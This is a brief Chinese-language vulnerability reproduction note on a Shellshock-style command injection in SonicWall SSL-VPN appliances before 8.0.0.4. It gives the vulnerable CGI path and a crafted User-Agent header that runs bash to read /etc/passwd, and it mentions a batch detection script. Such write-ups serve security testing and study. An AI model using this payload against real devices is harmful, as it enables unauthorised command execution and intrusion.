# 0x00 软件介绍
SonicWall：一款VPN解决方案，包含WEB界面、VPN功能等

# 0x01 复现环境
复现环境：公司实验室  
复现版本：SonicWall  
环境搭建：  
略

# 0x02 利用条件
无

# 0x03 影响版本
SonicWall SSL-VPN < 8.0.0.4

# 0x04 漏洞复现
攻击环境：kali x64  
访问目标，burp抓包，将访问地址修改为
```
/cgi-bin/jarrewrite.sh
```
将User-Agent修改为
```
User-Agent: () { :; }; echo ; /bin/bash -c 'cat /etc/passwd'
```
成功执行命令，如下图
![image](./0.png)

# 0x05 批量脚本
批量脚本见batch-detect.py（脚本很简陋，正在写脚本时，领导分配了一个渗透任务，实在没时间了。。），执行结果如下：  
![image](./1.png)

# 0x06 参考链接
https://github.com/darrenmartyn/VisualDoor/blob/main/visualdoor.py
